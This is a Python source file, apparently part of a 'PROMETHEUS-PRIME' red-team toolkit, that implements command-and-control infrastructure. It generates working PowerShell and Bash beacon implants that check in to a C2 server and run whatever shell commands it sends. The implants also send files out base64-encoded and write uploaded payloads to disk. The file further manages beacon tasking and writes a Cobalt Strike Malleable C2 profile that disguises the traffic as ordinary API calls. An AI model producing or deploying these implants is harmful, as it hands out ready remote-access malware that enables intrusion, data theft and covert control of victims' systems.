"""
═══════════════════════════════════════════════════════════════
RED TEAM OPERATIONS - Command & Control
PROMETHEUS-PRIME Domain 1.4
Authority Level: 9.9
═══════════════════════════════════════════════════════════════

Command and Control infrastructure management.

"""

import logging
import asyncio
import base64
import hashlib
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path

logger = logging.getLogger("PROMETHEUS-PRIME.RedTeam.C2")


class C2Protocol(Enum):
    """C2 communication protocols"""
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    ICMP = "icmp"
    SMB = "smb"
    TCP = "tcp"
    WEBSOCKET = "websocket"


class BeaconStatus(Enum):
    """Beacon status"""
    ACTIVE = "active"
    SLEEPING = "sleeping"
    LOST = "lost"
    TERMINATED = "terminated"


@dataclass
class C2Beacon:
    """C2 beacon/agent"""
    beacon_id: str
    hostname: str
    ip_address: str
    username: str
    os: str
    architecture: str
    process_name: str
    pid: int
    integrity_level: str
    protocol: C2Protocol
    last_checkin: datetime
    status: BeaconStatus
    sleep_time: int = 60
    jitter: int = 10


@dataclass
class C2Server:
    """C2 server configuration"""
    name: str
    protocol: C2Protocol
    listen_address: str
    listen_port: int
    ssl_cert: Optional[str] = None
    ssl_key: Optional[str] = None
    beacons: Dict[str, C2Beacon] = field(default_factory=dict)


class CommandControlServer:
    """
    Command & Control Infrastructure
    
    Capabilities:
    - Multi-protocol C2 (HTTP/HTTPS/DNS/etc.)
    - Beacon management
    - Task scheduling
    - Payload delivery
    - Data exfiltration channels
    - Encrypted communications
    - Evasive beaconing
    
 
    """
    
    def __init__(self):
        self.logger = logger
        self.servers: Dict[str, C2Server] = {}
        self.logger.info("C2 Server initialized")
    
    async def create_server(
        self,
        name: str,
        protocol: C2Protocol,
        listen_address: str,
        listen_port: int
    ) -> C2Server:
        """
        Create C2 server
        
        Args:
            name: Server name
            protocol: Communication protocol
            listen_address: Listen address 
            listen_port: Listen port
        
        Returns:
            C2Server instance
        """     
        
        self.logger.info(f"Creating C2 server: {name} on {listen_address}:{listen_port}")
        
        server = C2Server(
            name=name,
            protocol=protocol,
            listen_address=listen_address,
            listen_port=listen_port
        )
        
        self.servers[name] = server
        return server
    
    async def generate_beacon(
        self,
        server_name: str,
        target_os: str,
        target_arch: str,
        sleep_time: int = 60,
        jitter: int = 10
    ) -> str:
        """
        Generate beacon/agent for target
        
        Args:
            server_name: C2 server name
            target_os: Target OS (windows/linux/macos)
            target_arch: Target architecture (x64/x86)
            sleep_time: Beacon sleep interval (seconds)
            jitter: Random jitter percentage
        
        Returns:
            Beacon code
        """
        server = self.servers.get(server_name)
        if not server:
            raise ValueError(f"Server {server_name} not found")
        
        self.logger.info(f"Generating beacon for {target_os}/{target_arch}")
        
        if target_os.lower() == "windows":
            return self._generate_windows_beacon(server, sleep_time, jitter)
        elif target_os.lower() == "linux":
            return self._generate_linux_beacon(server, sleep_time, jitter)
        else:
            raise ValueError(f"Unsupported OS: {target_os}")
    
    def _generate_windows_beacon(
        self,
        server: C2Server,
        sleep_time: int,
        jitter: int
    ) -> str:
        """Generate Windows beacon"""
        
        return f'''# Windows C2 Beacon (PowerShell)

# Server: {server.listen_address}:{server.listen_port}

$c2Server = "{server.listen_address}"
$c2Port = {server.listen_port}
$sleepTime = {sleep_time}
$jitter = {jitter}

# Beacon ID generation
$beaconId = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME + "-" + $env:USERNAME))

function Get-SystemInfo {{
    $info = @{{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
        domain = $env:USERDOMAIN
        os = (Get-WmiObject Win32_OperatingSystem).Caption
        arch = $env:PROCESSOR_ARCHITECTURE
        ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{$_.InterfaceAlias -notlike "*Loopback*"}}).IPAddress
        process = (Get-Process -Id $PID).ProcessName
        pid = $PID
        integrity = "Medium"  # Simplified
    }}
    return $info | ConvertTo-Json
}}

function Send-Beacon {{
    param($data)
    
    try {{
        $uri = "http://$c2Server:$c2Port/beacon/$beaconId"
        $response = Invoke-WebRequest -Uri $uri -Method POST -Body $data -UseBasicParsing
        return $response.Content
    }} catch {{
        return $null
    }}
}}

function Execute-Task {{
    param($task)
    
    $taskType = $task.type
    $taskData = $task.data
    
    switch ($taskType) {{
        "shell" {{
            $output = Invoke-Expression $taskData 2>&1 | Out-String
            return @{{result = $output}}
        }}
        "download" {{
            $content = [System.IO.File]::ReadAllBytes($taskData)
            $encoded = [System.Convert]::ToBase64String($content)
            return @{{result = $encoded}}
        }}
        "upload" {{
            $decoded = [System.Convert]::FromBase64String($taskData.content)
            [System.IO.File]::WriteAllBytes($taskData.path, $decoded)
            return @{{result = "File uploaded"}}
        }}
        "sleep" {{
            $script:sleepTime = $taskData
            return @{{result = "Sleep time updated"}}
        }}
        default {{
            return @{{result = "Unknown task type"}}
        }}
    }}
}}

# Main beacon loop
Write-Host "[*] Beacon starting..."
Write-Host "[*] C2 Server: $c2Server:$c2Port"
Write-Host "[*] Beacon ID: $beaconId"
Write-Host "[*] Sleep: $sleepTime seconds (jitter: $jitter%)"

# Initial check-in
$sysInfo = Get-SystemInfo
$response = Send-Beacon -data $sysInfo

while ($true) {{
    # Calculate sleep with jitter
    $jitterAmount = [int]($sleepTime * $jitter / 100)
    $actualSleep = $sleepTime + (Get-Random -Minimum (-$jitterAmount) -Maximum $jitterAmount)
    
    Start-Sleep -Seconds $actualSleep
    
    # Check for tasks
    try {{
        $uri = "http://$c2Server:$c2Port/tasks/$beaconId"
        $response = Invoke-WebRequest -Uri $uri -Method GET -UseBasicParsing
        
        if ($response.StatusCode -eq 200) {{
            $tasks = $response.Content | ConvertFrom-Json
            
            foreach ($task in $tasks) {{
                Write-Host "[*] Executing task: $($task.type)"
                $result = Execute-Task -task $task
                
                # Send result back
                $resultData = @{{
                    task_id = $task.id
                    result = $result
                }} | ConvertTo-Json
                
                Send-Beacon -data $resultData
            }}
        }}
    }} catch {{
        # Silent failure - continue beaconing
    }}
}}
'''
    
    def _generate_linux_beacon(
        self,
        server: C2Server,
        sleep_time: int,
        jitter: int
    ) -> str:
        """Generate Linux beacon"""
        
        return f'''#!/bin/bash
# Linux C2 Beacon

# Server: {server.listen_address}:{server.listen_port}

C2_SERVER="{server.listen_address}"
C2_PORT="{server.listen_port}"
SLEEP_TIME={sleep_time}
JITTER={jitter}

# Generate beacon ID
BEACON_ID=$(echo -n "$(hostname)-$(whoami)" | base64)

# Get system info
get_sysinfo() {{
    cat << EOF
{{
    "hostname": "$(hostname)",
    "username": "$(whoami)",
    "os": "$(uname -s)",
    "kernel": "$(uname -r)",
    "arch": "$(uname -m)",
    "ip": "$(hostname -I | awk '{{print $1}}')",
    "process": "$$",
    "pid": $$
}}
EOF
}}

# Send beacon
send_beacon() {{
    local data="$1"
    curl -s -X POST \\
        -H "Content-Type: application/json" \\
        -d "$data" \\
        "http://$C2_SERVER:$C2_PORT/beacon/$BEACON_ID"
}}

# Execute task
execute_task() {{
    local task_type="$1"
    local task_data="$2"
    
    case "$task_type" in
        "shell")
            eval "$task_data" 2>&1
            ;;
        "download")
            base64 "$task_data"
            ;;
        "upload")
            echo "$task_data" | base64 -d > "$task_path"
            echo "File uploaded"
            ;;
        *)
            echo "Unknown task type"
            ;;
    esac
}}

# Main beacon loop
echo "[*] Beacon starting..."
echo "[*] C2 Server: $C2_SERVER:$C2_PORT"
echo "[*] Beacon ID: $BEACON_ID"
echo "[*] Sleep: $SLEEP_TIME seconds (jitter: $JITTER%)"

# Initial check-in
sysinfo=$(get_sysinfo)
send_beacon "$sysinfo"

while true; do
    # Calculate sleep with jitter
    jitter_amount=$((SLEEP_TIME * JITTER / 100))
    actual_sleep=$((SLEEP_TIME + RANDOM % (jitter_amount * 2) - jitter_amount))
    
    sleep $actual_sleep
    
    # Check for tasks
    tasks=$(curl -s "http://$C2_SERVER:$C2_PORT/tasks/$BEACON_ID")
    
    if [ -n "$tasks" ]; then
        # Parse and execute tasks (simplified)
        echo "[*] Tasks received"
    fi
done
'''
    
    async def register_beacon(
        self,
        server_name: str,
        beacon_data: Dict[str, Any]
    ) -> C2Beacon:
        """
        Register new beacon check-in
        
        Args:
            server_name: C2 server name
            beacon_data: Beacon information
        
        Returns:
            C2Beacon instance
        """
        server = self.servers.get(server_name)
        if not server:
            raise ValueError(f"Server {server_name} not found")
        
        beacon_id = beacon_data.get("beacon_id", "UNKNOWN")
        
        beacon = C2Beacon(
            beacon_id=beacon_id,
            hostname=beacon_data.get("hostname", "unknown"),
            ip_address=beacon_data.get("ip", "0.0.0.0"),
            username=beacon_data.get("username", "unknown"),
            os=beacon_data.get("os", "unknown"),
            architecture=beacon_data.get("arch", "unknown"),
            process_name=beacon_data.get("process", "unknown"),
            pid=beacon_data.get("pid", 0),
            integrity_level=beacon_data.get("integrity", "unknown"),
            protocol=server.protocol,
            last_checkin=datetime.now(),
            status=BeaconStatus.ACTIVE
        )
        
        server.beacons[beacon_id] = beacon
        self.logger.info(f"Beacon registered: {beacon_id} ({beacon.hostname})")
        
        return beacon
    
    async def task_beacon(
        self,
        server_name: str,
        beacon_id: str,
        task_type: str,
        task_data: Any
    ) -> Dict[str, Any]:
        """
        Task a beacon to execute command
        
        Args:
            server_name: C2 server name
            beacon_id: Beacon ID
            task_type: Task type (shell, download, upload, etc.)
            task_data: Task data
        
        Returns:
            Task information
        """
        server = self.servers.get(server_name)
        if not server:
            raise ValueError(f"Server {server_name} not found")
        
        beacon = server.beacons.get(beacon_id)
        if not beacon:
            raise ValueError(f"Beacon {beacon_id} not found")
        
        self.logger.info(f"Tasking beacon {beacon_id}: {task_type}")
        
        task = {
            "id": hashlib.md5(f"{beacon_id}{task_type}{datetime.now()}".encode()).hexdigest()[:8],
            "type": task_type,
            "data": task_data,
            "timestamp": datetime.now().isoformat()
        }
        
        return task
    
    async def generate_malleable_c2_profile(
        self,
        profile_name: str
    ) -> str:
        """
        Generate Cobalt Strike Malleable C2 profile
        
        Args:
            profile_name: Profile name
        
        Returns:
            Profile content
        """
        self.logger.info(f"Generating Malleable C2 profile: {profile_name}")
        
        return f'''# Malleable C2 Profile: {profile_name}

# Compatible with Cobalt Strike

set sleeptime "60000";
set jitter    "20";
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {{
    set uri "/api/v1/status /api/v2/check";
    
    client {{
        header "Accept" "application/json";
        header "Accept-Language" "en-US,en;q=0.9";
        
        metadata {{
            base64url;
            prepend "session=";
            header "Cookie";
        }}
    }}
    
    server {{
        header "Content-Type" "application/json";
        header "Server" "nginx/1.18.0";
        
        output {{
            base64url;
            prepend "{{\\"status\\":\\"ok\\",\\"data\\":\\"";
            append "\\"}}";
            print;
        }}
    }}
}}

http-post {{
    set uri "/api/v1/submit /api/v2/upload";
    
    client {{
        header "Content-Type" "application/json";
        
        id {{
            base64url;
            prepend "id=";
            header "Cookie";
        }}
        
        output {{
            base64url;
            prepend "{{\\"data\\":\\"";
            append "\\"}}";
            print;
        }}
    }}
    
    server {{
        header "Content-Type" "application/json";
        
        output {{
            base64url;
            prepend "{{\\"result\\":\\"";
            append "\\"}}";
            print;
        }}
    }}
}}

# DNS beaconing
dns-beacon {{
    set dns_idle "8.8.8.8";
    set dns_sleep "0";
    set maxdns    "235";
    set dns_stager_prepend ".stage.";
    set dns_stager_subhost ".test.";
    set dns_max_txt "252";
    set dns_ttl "5";
}}
'''


# Export
__all__ = [
    'CommandControlServer',
    'C2Server',
    'C2Beacon',
    'C2Protocol',
    'BeaconStatus',
]